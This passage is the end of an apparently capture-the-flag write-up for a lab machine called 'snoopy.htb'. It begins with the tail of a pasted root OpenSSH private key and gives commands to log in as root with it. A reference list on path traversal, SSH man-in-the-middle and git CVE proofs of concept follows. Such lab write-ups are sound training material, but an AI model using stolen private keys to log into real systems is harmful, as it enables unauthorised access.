b9MNQg/YZmrZBnHmUBCvbCzq/4tj45MuHq2bUMIaUKpkRGY1cv1BH+06NV0irTSue/r64U
+WJyKyl4k+oqCPCAgl4rRQiLftKebRAgY7+uMhFCo63W5NRApcdO+s0m7lArpj2rVB1oLv
dydq+68CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf4
9O15RLXne6qtCNxZpDjt3u7646/aN32v7UVzGV7tw4k/H8PyU819R9GcCR4wydLcB4bY4b
NQ/nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR+ucHi1W+njba6e
SN/sjHa19HkZJeLcyGmU34/ESyN6HqFLOXfyGjqTldwVVutrE/Mvkm3ii/0GqDkqW3PwgW
atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

All that's left is to connect with the root user's SSH private key:

```bash
❯ chmod 600 root.key
❯ ssh -i root.key root@snoopy.htb
```

## Ressources

- [https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/)
- [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
- [https://github.com/ssh-mitm/ssh-mitm](https://github.com/ssh-mitm/ssh-mitm)
- [https://github.com/bruno-1337/CVE-2023-23946-POC](https://github.com/bruno-1337/CVE-2023-23946-POC)
- [https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/](https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/)
- [https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh](https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh)
- [https://github.com/git/git/security/advisories/GHSA-gw92-x3fm-3g3q](https://github.com/git/git/security/advisories/GHSA-gw92-x3fm-3g3q)
- [https://github.com/Cisco-Talos/clamav/commit/acf44eae4844557cf341614a9e41ab439e5e2258](https://github.com/Cisco-Talos/clamav/commit/acf44eae4844557cf341614a9e41ab439e5e2258)
- [https://newosxbook.com/DMG.html](https://newosxbook.com/DMG.html)
